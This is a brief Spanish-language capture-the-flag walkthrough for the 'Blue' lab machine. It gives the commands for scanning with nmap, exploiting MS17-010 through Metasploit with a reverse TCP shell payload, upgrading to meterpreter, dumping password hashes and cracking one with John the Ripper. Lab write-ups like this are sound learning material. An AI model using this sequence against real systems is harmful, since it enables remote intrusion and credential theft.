# BLUE

## NMAP
![alt text](image-1.png)
![alt text](image.png)

Buscamos vulnerabilidades 

    nmap -sV -sC --script vuln 10.10.141.85

![alt text](image-2.png)

## Metasploit
Buscamos la vunerabilidad anterior 

    search ms17-010

![alt text](image-3.png)

Establecemos ``RHOSTS``
![alt text](image-4.png)

    set payload windows/x64/shell/reverse_tcp

Ejecutamos el exploit y tendremos una shell, salimos con ``CTRL + Z``

Buscamos un modulo que permita cambiar de shell a meterpreter

    search shell_to_meterpreter


![alt text](image-5.png)

Ejecutamos con ``run`` y tendremos 2 sesiones iniciadas
![alt text](image-6.png)


Listamos todos los procesos corriendo con ``ps``
![alt text](image-7.png)

Tendremos que migrar a un proceso, en este caso ``1540``

    migrate 1540

Usamos el comando ``hashdump``, para ver los hashes de las contraseñas
![alt text](image-8.png)

Pasamos el hash a un txt y lo rompemos

    echo 'ffb43f0de35be4d9917ac0cc8ad57f8d' > hash.txt

    john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

![alt text](image-9.png)

## Flags
En ``C:`` encontraremos la primera flag
![alt text](image-10.png)

En ``c:\Windows\System32\Config`` encontramos la segunda flag
![alt text](image-11.png)

Dentro de los documentos de Jon encontramos la tercera flag
![alt text](image-12.png)
